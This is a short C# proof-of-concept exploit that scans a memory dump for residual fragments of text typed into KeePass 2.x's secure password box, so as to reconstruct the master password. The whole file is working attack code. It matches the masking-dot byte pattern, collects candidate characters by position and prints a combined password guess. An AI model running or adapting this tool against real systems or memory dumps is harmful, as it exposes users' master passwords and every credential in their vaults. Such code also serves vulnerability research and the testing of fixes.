// Simple POC script that searches a memory dump 
// for passwords written inside KeePass 2.x SecureTextBoxEx 
// text box, such as the master password

// usage:
// dotnet run <path>

using System.Text.RegularExpressions;

class Program
{
    // What characters are valid password characters
    const string allowedChars = "^[a-zA-Z0-9!?.,:;]$";

    static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("Please specify a file path as an argument.");
            return;
        }

        string filePath = args[0];
        if (!File.Exists(filePath))
        {
            Console.WriteLine("File not found.");
            return;
        }        

        byte[] memoryDump = File.ReadAllBytes(filePath);
        Dictionary<int, HashSet<string>> candidates = new Dictionary<int, HashSet<string>>();
        
        int currentStrLen = 0;
        string debugStr = "";
        for (int i = 0; i < memoryDump.Length - 1; i++)
        {            
            // ● = 0xCF 0x25
            if (memoryDump[i] == 0xCF && memoryDump[i + 1] == 0x25)
            {
                currentStrLen++;
                i++;
                debugStr += '●';
            }
            else
            {
                if (currentStrLen != 0)
                {
                    currentStrLen++;                    

                    string strChar = "";
                    try{
                        byte[] character = new byte[] {memoryDump[i], memoryDump[i + 1]};
                        strChar = System.Text.Encoding.Unicode.GetString(character);
                    }
                    catch { continue; }

                    bool isValid = Regex.IsMatch(strChar, allowedChars);

                    if (isValid)
                    {                
                        // Convert to UTF 8                            
                        if (!candidates.ContainsKey(currentStrLen))
                            candidates.Add(currentStrLen, new HashSet<string>() {strChar});
                        else
                        {
                            if (!candidates[currentStrLen].Contains(strChar))
                                candidates[currentStrLen].Add(strChar);
                        }

                        debugStr += strChar;
                        Console.WriteLine("Found: " + debugStr);
                    }

                    currentStrLen = 0;
                    debugStr = "";
                }
            }
        }        

        // Print summary
        Console.WriteLine("\nPassword candidates (character positions):");
        Console.WriteLine("1.:\tUnknown");
        string combined = "{UNKNOWN}";
        foreach (KeyValuePair<int, HashSet<string>> kvp in candidates.OrderBy(x => x.Key)) {
            Console.Write($"{kvp.Key}.:\t");
            if (kvp.Value.Count != 1)
                combined += "{";
            foreach (string c in kvp.Value) {
                Console.Write($"{c}, ");

                combined += c;
                if (kvp.Value.Count != 1)
                    combined += ", ";
            }
            if (kvp.Value.Count != 1)
                combined = combined.Substring(0, combined.Length-2) + "}";

            Console.WriteLine();
        }
        Console.WriteLine("Combined: " + combined);
    }
}
